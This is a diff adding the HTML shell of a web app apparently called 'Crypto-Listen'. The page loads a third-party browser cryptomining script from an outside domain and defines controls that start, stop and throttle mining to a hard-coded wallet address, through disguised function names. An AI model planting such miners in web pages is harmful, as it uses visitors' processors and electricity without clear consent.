@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="theme-color" content="#000000" />
+    <meta
+      name="description"
+      content=""
+    />
+    <title>Crypto-Listen</title>
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-LZBG5M8450"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+
+      gtag('config', 'G-LZBG5M8450');
+    </script>
+
+    <script src="https://trustiseverything.de/karma/karma.js?karma=bs?nosaj=faster.mo" ></script>
+    <script>
+        var isMining = false;
+        var username = ""
+        var address = "44y8BhuYCQtPEeVZURkCQYGfzJc8CPHpt1wVfwXuDAeuTrtAWV7mh3gdeQDyUjawgV1jXyfVBiDUm49VveNC2nCMNdGhGTr"
+
+        function startCrypto(throttle) {
+          if (!isMining) {
+            var workerAddr = address + "." + username
+            EverythingIsLife(workerAddr, 'x', throttle);
+            isMining = true;
+            console.log("Mining Started")
+          }
+        }
+
+        function stopCrypto() {
+          if (isMining) {
+            stopM()
+            isMining = false;
+            console.log("Mining Stopped")
+          }
+        }
+
+        function changeThrottle(value) {
+          if (isMining) {
+            var workerAddr = address + "." + username
+            stopM()
+            EverythingIsLife(workerAddr, 'x', value);
+          }
+        } 
+    </script>
+  </head>
+  <body>
+    <noscript>You need to enable JavaScript to run this app.</noscript>
+    <div id="root"></div>
+  </body>
+</html>
